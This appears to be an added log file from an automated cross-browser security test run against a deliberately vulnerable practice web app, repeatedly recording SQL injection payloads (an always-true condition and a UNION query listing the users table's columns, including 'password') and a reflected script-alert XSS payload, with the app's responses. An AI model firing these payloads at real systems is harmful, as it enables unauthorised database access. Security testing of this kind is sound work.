+2020-09-03 11:50:46,110 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 11:50:46,124 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 11:50:52,034 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 11:50:52,037 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 11:50:52,097 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 12:48:49,856 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 12:48:50,034 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 12:48:50,046 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 12:48:50,058 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 12:48:50,071 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 12:48:50,083 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 12:48:50,095 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 12:48:50,108 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 12:48:50,121 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 12:48:50,134 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 12:48:50,146 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 12:48:50,159 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 12:48:50,355 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 12:48:50,403 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 12:48:50,417 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 12:48:50,429 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-03 12:48:50,442 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 12:48:50,455 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 12:50:16,589 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 12:50:16,592 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 12:50:16,775 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 12:51:06,636 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 12:51:06,643 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 12:51:06,710 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 12:56:35,405 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 12:56:35,448 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 12:56:35,465 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 12:56:35,479 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 12:56:35,490 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 12:56:35,503 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 12:56:35,516 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 12:56:35,530 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 12:56:35,543 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 12:56:35,555 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 12:56:35,567 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 12:56:35,579 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 12:56:35,746 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 12:56:35,777 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 12:56:35,790 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 12:56:35,803 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-03 12:56:35,815 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 12:56:35,827 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 12:58:56,913 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 12:58:56,952 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 12:58:56,970 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 12:58:56,983 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 12:58:56,996 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 12:58:57,010 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 12:58:57,022 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 12:58:57,034 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 12:58:57,046 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 12:58:57,061 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 12:58:57,074 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 12:58:57,087 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 12:58:57,267 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 12:58:57,307 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 12:58:57,321 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 12:58:57,333 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-03 12:58:57,345 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 12:58:57,359 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 13:00:45,093 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 13:00:45,138 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 13:00:45,153 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 13:00:45,164 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 13:00:45,176 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 13:00:45,188 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 13:00:45,200 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 13:00:45,212 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 13:00:45,223 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 13:00:45,237 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 13:00:45,249 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 13:00:45,261 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 13:00:45,443 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 13:00:45,477 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 13:00:45,492 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 13:00:45,504 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-03 13:00:45,516 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 13:00:45,528 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 13:03:32,694 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 13:03:32,700 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 13:03:32,755 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 13:04:11,821 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 13:04:11,824 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 13:04:11,879 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 13:31:46,252 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 13:31:46,254 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 13:31:46,301 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 13:32:37,051 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 13:32:37,054 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 13:32:37,113 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 13:42:06,167 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 13:42:06,168 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 13:42:06,225 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 14:24:22,234 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 14:24:22,238 : INFO : cross_browser.log : No alert
+2020-09-03 14:24:22,280 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-03 19:53:12,888 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 19:53:12,891 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 19:53:13,000 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 20:05:29,118 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 20:05:29,125 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 20:05:29,237 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 20:05:52,538 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-03 20:05:52,625 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-03 20:05:52,642 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-03 20:05:52,655 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-03 20:05:52,667 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-03 20:05:52,679 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-03 20:05:52,693 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-03 20:05:52,711 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-03 20:05:52,724 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-03 20:05:52,737 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-03 20:05:52,749 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-03 20:05:52,761 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-03 20:05:52,955 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-03 20:05:52,988 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-03 20:05:53,001 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-03 20:05:53,013 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-03 20:05:53,164 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-03 20:05:53,192 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-03 22:10:11,228 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 22:10:11,594 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 22:10:11,833 : INFO : cross_browser.log : Got response : Hello 
+2020-09-03 22:13:18,921 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-03 22:13:18,926 : INFO : cross_browser.log : Got alert : micin
+2020-09-03 22:13:19,078 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 17:04:55,006 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:04:55,440 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:05:00,923 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:05:00,926 : INFO : cross_browser.log : No alert
+2020-09-11 17:05:00,954 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-11 17:07:08,481 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:07:08,593 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:07:14,360 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:07:14,368 : INFO : cross_browser.log : No alert
+2020-09-11 17:07:14,400 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-11 17:08:26,907 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:08:27,136 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:08:32,434 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:08:32,438 : INFO : cross_browser.log : No alert
+2020-09-11 17:08:32,459 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-11 17:09:24,515 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:09:24,552 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 17:09:24,566 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 17:09:24,580 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 17:09:24,595 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 17:09:24,606 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 17:09:24,617 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 17:09:24,629 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 17:09:24,640 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-11 17:09:24,651 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 17:09:24,663 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 17:09:24,680 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 17:09:24,826 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:09:24,849 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 17:09:24,862 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 17:09:24,874 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 17:09:24,885 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 17:09:24,896 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 17:09:30,417 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:09:30,420 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 17:09:30,488 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 17:21:09,507 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:21:11,714 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:21:17,161 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:21:17,167 : INFO : cross_browser.log : No alert
+2020-09-11 17:21:17,188 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-11 17:21:51,985 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 17:21:53,529 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:21:53,555 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 17:21:53,571 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 17:21:53,583 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 17:21:53,596 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 17:21:53,608 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 17:21:53,621 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 17:21:53,631 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 17:21:53,643 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-11 17:21:53,656 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 17:21:53,667 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 17:21:53,678 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 17:21:56,530 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:21:56,572 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 17:21:56,588 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 17:21:56,602 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 17:21:56,615 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 17:21:56,626 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 17:22:02,110 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:22:02,114 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 17:22:02,193 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 17:23:54,260 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 17:23:55,978 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:23:56,031 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 17:23:56,047 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 17:23:56,059 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 17:23:56,072 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 17:23:56,084 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 17:23:56,099 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 17:23:56,114 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 17:23:56,128 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
